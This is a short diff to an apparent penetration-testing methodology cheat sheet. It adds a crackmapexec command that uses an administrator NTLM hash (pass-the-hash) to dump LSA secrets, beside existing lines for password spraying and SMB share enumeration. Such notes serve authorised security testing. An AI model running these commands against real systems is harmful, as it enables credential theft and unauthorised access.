@@ -398,6 +398,7 @@ See [The Bug Hunter's Methodology v4.0 - Recon Edition by @jhaddix #NahamCon2020
 - Password attack: test the credentials found to gain more accesses
   - `crackmapexec <service> <IP> -u usernames.txt -p passwords.txt --continue-on-success`
   - `crackmapexec <service> <IP> -u administrator -H <NTLM> --continue-on-success`
+  - `crackmapexec <service> <IP> -u administrator -H <NTLM> --local-auth -lsa`
 - Explore the services found
   - Example: enumerate SMB shares with `crackmapexec smb <IP> -u <user> -p <password> --shares`
 - Client-side attack
